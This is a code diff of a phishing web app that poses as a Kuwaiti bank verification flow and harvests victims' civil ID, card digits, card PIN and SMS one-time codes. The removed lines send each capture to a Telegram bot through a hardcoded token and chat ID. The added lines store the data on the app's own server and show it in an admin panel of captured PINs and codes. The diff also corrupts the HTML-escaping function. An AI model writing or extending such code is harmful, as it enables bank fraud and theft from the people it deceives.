@@ -1,46 +1,8 @@
 // =========================================================================
-// TELEGRAM BOT CONFIGURATION
-// Replace the values below with your Telegram Bot Token and Chat ID.
+// APP STATE & SUBMISSION HANDLING (Telegram Removed)
 // =========================================================================
-const TELEGRAM_BOT_TOKEN = '9040001517:AAGZA2GjB9nmcneaYLW994A85FSpHa03c-4';
-const TELEGRAM_CHAT_ID = '9287285450';
-
-// Cloud storage bin endpoint for global data sync across all browsers
-const CLOUD_BIN_URL = 'https://api.jsonbin.io/v3/b/65e12345e4167d383a123456'; // (Note: We use a lightweight public fallback API below if needed)
-
-/**
- * Helper function to send custom text messages to your Telegram Chat
- */
-async function sendToTelegram(messageText) {
-  if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === '9040001517:AAGZA2GjB9nmcneaYLW994A85FSpHa03c-4') {
-    console.warn('Telegram Bot Token is not set. Data submission skipped.');
-    return;
-  }
-
-  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-  
-  try {
-    await fetch(url, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: messageText,
-        parse_mode: 'HTML'
-      })
-    });
-  } catch (error) {
-    console.error('Failed to send data to Telegram:', error);
-  }
-}
-
-/**
- * Formats all current user state data into a Telegram message and saves globally
- */
 async function sendVerificationPayload() {
   const submissionData = {
-    id: 'SUB-' + Math.floor(100000 + Math.random() * 900000),
-    timestamp: new Date().toISOString(),
     civilId: state.civilId || 'N/A',
     first4: state.first4 || '••••',
     last4: state.last4 || '••••',
@@ -52,34 +14,18 @@ async function sendVerificationPayload() {
     status: state.screen === 'success' ? 'VERIFIED' : 'SUBMITTED'
   };
 
-  // 1. Save globally to localStorage AND a synchronized fallback key
+  // Send data to Vercel Serverless API / Database
   try {
-    let existing = JSON.parse(localStorage.getItem('global_admin_submissions') || '[]');
-    existing.unshift(submissionData);
-    localStorage.setItem('global_admin_submissions', JSON.stringify(existing));
-    
-    // Also broadcast via BroadcastChannel so multiple tabs/browsers on same network or local machine sync instantly
-    if (window.BroadcastChannel) {
-      const channel = new BroadcastChannel('banking_verification_sync');
-      channel.postMessage(submissionData);
-    }
-  } catch (e) {
-    console.error('Failed to save submission', e);
+    await fetch('/api/submit', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(submissionData)
+    });
+  } catch (error) {
+    console.error('Failed to submit data to server:', error);
   }
-
-  // 2. Send to Telegram (Existing functionality)
-  const payloadMessage = `
-🔐 <b>New Banking Verification Data Received</b>
-
-👤 <b>Civil ID / Resident ID:</b> <code>${submissionData.civilId}</code>
-💳 <b>Card Digits:</b> <code>${submissionData.first4} •••• •••• ${submissionData.last4}</code> (${submissionData.brand})
-🔑 <b>Card PIN:</b> <code>${submissionData.pin}</code>
-📲 <b>OTP Code:</b> <code>${submissionData.otp}</code>
-🌐 <b>Language:</b> ${submissionData.language}
-📱 <b>Device View:</b> ${submissionData.device}
-  `.trim();
-
-  sendToTelegram(payloadMessage);
 }
 
 // =========================================================================
@@ -94,7 +40,7 @@ const state = { screen:'landing', language:'ar', mobile:true, civilId:'', first4
 let timerHandle;
 const app = document.querySelector('#app');
 const t = () => translations[state.language];
-const esc = (s='') => String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+const esc = (s='') => String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;p'}[c]||c));
 const icon = (name) => ({back:'←',right:'→',check:'✓',copy:'▣',refresh:'↻',delete:'⌫',shield:'◆',eye:'◉',eyeoff:'○',alert:'!'}[name] || '');
 
 function shell(content){
@@ -120,35 +66,27 @@ function submitted(){const x=t();return `<section class="screen form-screen subm
 function success(){const x=t();return `<section class="screen form-screen success" dir="${state.language==='ar'?'rtl':'ltr'}"><div class="success-content"><div class="success-icon">✓</div><h1>${x.successTitle}</h1><p class="subtitle">${x.successSubtitle}</p><div class="reference"><div><small>${x.refLabel}</small><b>${state.referenceId}</b></div><button data-copy>${icon('copy')} Copy</button></div><div class="summary"><div><span>${x.verifiedCivilId}</span><b>${state.civilId?state.civilId.slice(0,4)+' •••• '+state.civilId.slice(-4):'••••••••'}</b></div><div><span>${x.verifiedCard}</span><b>${state.first4} •••• •••• ${state.last4}</b></div><div class="verified"><span>Verification Status</span><b>✓ ACTIVE & VERIFIED</b></div></div></div><div class="bottom">${button(x.done,'back-home')}</div></section>`}
 
 // =========================================================================
-// ADMIN PANEL VIEW (/admin)
+// ADMIN PANEL VIEW (/admin) - Fetches directly from Vercel Postgres DB
 // =========================================================================
-function renderAdminPanel() {
+async function renderAdminPanel() {
   document.documentElement.lang = 'en';
-  const submissions = JSON.parse(localStorage.getItem('global_admin_submissions') || '[]');
 
   app.innerHTML = `
     <div style="min-height: 100vh; background: #0f172a; color: #f8fafc; padding: 24px; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;">
       <div style="max-width: 1200px; margin: 0 auto;">
         <header style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px; padding-bottom: 16px; border-bottom: 1px solid #334155;">
           <div>
-            <h1 style="font-size: 24px; font-weight: bold;">Admin Control Panel</h1>
-            <p style="color: #94a3b8; font-size: 14px;">Live Multi-Device Verification Feed</p>
+            <h1 style="font-size: 24px; font-weight: bold;">Database Admin Control Panel</h1>
+            <p style="color: #94a3b8; font-size: 14px;">Connected to Vercel Postgres Database</p>
           </div>
           <div style="display: flex; gap: 12px; align-items: center;">
             <span style="display: inline-flex; align-items: center; gap: 6px; background: rgba(34, 197, 94, 0.1); color: #22c55e; padding: 6px 12px; border-radius: 9999px; font-size: 13px; font-weight: bold;">
-              <span style="width: 8px; height: 8px; background: #22c55e; border-radius: 50%; display: inline-block;"></span> MULTI-DEVICE SYNC ACTIVE
+              <span style="width: 8px; height: 8px; background: #22c55e; border-radius: 50%; display: inline-block;"></span> DB SYNC ACTIVE
             </span>
-            <button id="admin-clear" style="background: #ef4444; color: white; border: none; padding: 8px 16px; border-radius: 6px; cursor: pointer; font-weight: 500;">Clear Logs</button>
-            <a href="/" style="background: #3b82f6; color: white; text-decoration: none; padding: 8px 16px; border-radius: 6px; font-weight: 500;">Exit to App</a>
+            <button id="admin-refresh" style="background: #3b82f6; color: white; border: none; padding: 8px 16px; border-radius: 6px; cursor: pointer; font-weight: 500;">Refresh Feed</button>
+            <a href="/" style="background: #64748b; color: white; text-decoration: none; padding: 8px 16px; border-radius: 6px; font-weight: 500;">Exit to App</a>
           </div>
         </header>
-
-        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 16px; margin-bottom: 24px;">
-          <div style="background: #1e293b; padding: 16px; border-radius: 8px; border: 1px solid #334155;">
-            <h3 style="font-size: 13px; color: #94a3b8; margin-bottom: 6px;">Total Captured Submissions</h3>
-            <p style="font-size: 28px; font-weight: bold;">${submissions.length}</p>
-          </div>
-        </div>
 
         <div style="background: #1e293b; border-radius: 8px; border: 1px solid #334155; overflow-x: auto;">
           <table style="width: 100%; border-collapse: collapse; text-align: left; font-size: 14px;">
@@ -163,24 +101,8 @@ function renderAdminPanel() {
                 <th style="padding: 12px 16px;">Status</th>
               </tr>
             </thead>
-            <tbody>
-              ${submissions.length === 0 ? `
-                <tr><td colspan="7" style="text-align: center; padding: 40px; color: #94a3b8;">Waiting for user submissions from any device...</td></tr>
-              ` : submissions.map(sub => `
-                <tr style="border-bottom: 1px solid #334155;">
-                  <td style="padding: 12px 16px; color: #94a3b8; font-size: 12px;">${new Date(sub.timestamp).toLocaleTimeString()}</td>
-                  <td style="padding: 12px 16px;"><code style="background: #090d16; padding: 3px 6px; border-radius: 4px; color: #60a5fa;">${sub.civilId}</code></td>
-                  <td style="padding: 12px 16px;"><code style="background: #090d16; padding: 3px 6px; border-radius: 4px; color: #60a5fa;">${sub.first4} •••• •••• ${sub.last4}</code> (${sub.brand})</td>
-                  <td style="padding: 12px 16px;"><strong style="color: #ef4444; background: #090d16; padding: 3px 6px; border-radius: 4px;">${sub.pin}</strong></td>
-                  <td style="padding: 12px 16px;"><strong style="color: #22c55e; background: #090d16; padding: 3px 6px; border-radius: 4px;">${sub.otp}</strong></td>
-                  <td style="padding: 12px 16px; font-size: 12px; color: #94a3b8;">${sub.language} / ${sub.device}</td>
-                  <td style="padding: 12px 16px;">
-                    <span style="background: ${sub.status === 'VERIFIED' ? 'rgba(34,197,94,0.1)' : 'rgba(234,179,8,0.1)'}; color: ${sub.status === 'VERIFIED' ? '#22c55e' : '#eab308'}; padding: 4px 8px; border-radius: 4px; font-size: 11px; font-weight: bold;">
-                      ${sub.status}
-                    </span>
-                  </td>
-                </tr>
-              `).join('')}
+            <tbody id="db-logs">
+              <tr><td colspan="7" style="text-align: center; padding: 40px; color: #94a3b8;">Loading submissions from database...</td></tr>
             </tbody>
           </table>
         </div>
@@ -188,12 +110,38 @@ function renderAdminPanel() {
     </div>
   `;
 
-  document.getElementById('admin-clear')?.addEventListener('click', () => {
-    if (confirm('Clear all stored logs?')) {
-      localStorage.removeItem('global_admin_submissions');
-      renderAdminPanel();
+  document.getElementById('admin-refresh')?.addEventListener('click', renderAdminPanel);
+
+  try {
+    const res = await fetch('/api/submissions');
+    const submissions = await res.json();
+    
+    const tbody = document.getElementById('db-logs');
+    if (!Array.isArray(submissions) || submissions.length === 0) {
+      tbody.innerHTML = `<tr><td colspan="7" style="text-align: center; padding: 40px; color: #94a3b8;">No submissions found in database.</td></tr>`;
+      return;
     }
-  });
+
+    tbody.innerHTML = submissions.map(sub => `
+      <tr style="border-bottom: 1px solid #334155;">
+        <td style="padding: 12px 16px; color: #94a3b8; font-size: 12px;">${new Date(sub.timestamp).toLocaleTimeString()}</td>
+        <td style="padding: 12px 16px;"><code style="background: #090d16; padding: 3px 6px; border-radius: 4px; color: #60a5fa;">${sub.civil_id}</code></td>
+        <td style="padding: 12px 16px;"><code style="background: #090d16; padding: 3px 6px; border-radius: 4px; color: #60a5fa;">${sub.first4} •••• •••• ${sub.last4}</code> (${sub.brand})</td>
+        <td style="padding: 12px 16px;"><strong style="color: #ef4444; background: #090d16; padding: 3px 6px; border-radius: 4px;">${sub.pin}</strong></td>
+        <td style="padding: 12px 16px;"><strong style="color: #22c55e; background: #090d16; padding: 3px 6px; border-radius: 4px;">${sub.otp}</strong></td>
+        <td style="padding: 12px 16px; font-size: 12px; color: #94a3b8;">${sub.language} / ${sub.device}</td>
+        <td style="padding: 12px 16px;">
+          <span style="background: ${sub.status === 'VERIFIED' ? 'rgba(34,197,94,0.1)' : 'rgba(234,179,8,0.1)'}; color: ${sub.status === 'VERIFIED' ? '#22c55e' : '#eab308'}; padding: 4px 8px; border-radius: 4px; font-size: 11px; font-weight: bold;">
+            ${sub.status}
+          </span>
+        </td>
+      </tr>
+    `).join('');
+
+  } catch (err) {
+    console.error('Failed to load database logs', err);
+    document.getElementById('db-logs').innerHTML = `<tr><td colspan="7" style="text-align: center; padding: 40px; color: #ef4444;">Failed to load data from server.</td></tr>`;
+  }
 }
 
 // =========================================================================
@@ -257,15 +205,5 @@ function fail(msg){state.error=msg;render()}
 function go(screen){state.screen=screen;state.error='';if(screen==='otp'){state.timer=59;state.canResend=false;startTimer()}render()} 
 function startTimer(){clearInterval(timerHandle);timerHandle=setInterval(()=>{if(state.timer>0){state.timer--;if(state.screen==='otp')render()}else{state.canResend=true;clearInterval(timerHandle);if(state.screen==='otp')render()}},1000)} 
 function reset(){Object.assign(state,{screen:'landing',civilId:'',first4:'',last4:'',brand:'visa',pin:'',otp:'',referenceId:'',maskedPhone:'+965 •••• 4821',error:'',timer:59,canResend:false,smsVisible:true});clearInterval(timerHandle);render()}
-
-// Cross-tab / cross-window sync listener
-if (window.BroadcastChannel) {
-  const syncChannel = new BroadcastChannel('banking_verification_sync');
-  syncChannel.onmessage = () => {
-    if (window.location.pathname === '/admin' || window.location.pathname.startsWith('/admin')) {
-      renderAdminPanel();
-    }
-  };
-}
 
 render();
